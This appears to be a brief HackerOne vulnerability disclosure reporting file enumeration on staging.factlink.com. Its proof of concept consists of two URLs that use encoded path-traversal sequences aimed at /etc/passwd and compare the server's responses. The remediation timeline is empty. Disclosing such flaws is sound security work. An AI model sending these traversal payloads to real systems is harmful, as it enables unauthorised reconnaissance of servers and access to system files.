# HackerOne Report: File name/folder enumeration.
**Report ID:** 35823
**Vulnerability Class:** Information Disclosure

## Vulnerability Information & PoC
Hello,
an attacker may be able to map your server and find configuration file names by the following method:

Valid attempt (Not found):
https://staging.factlink.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

Invalid attempt (404)
https://staging.factlink.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd_Nonexistant

## Discussion & Remediation Timeline
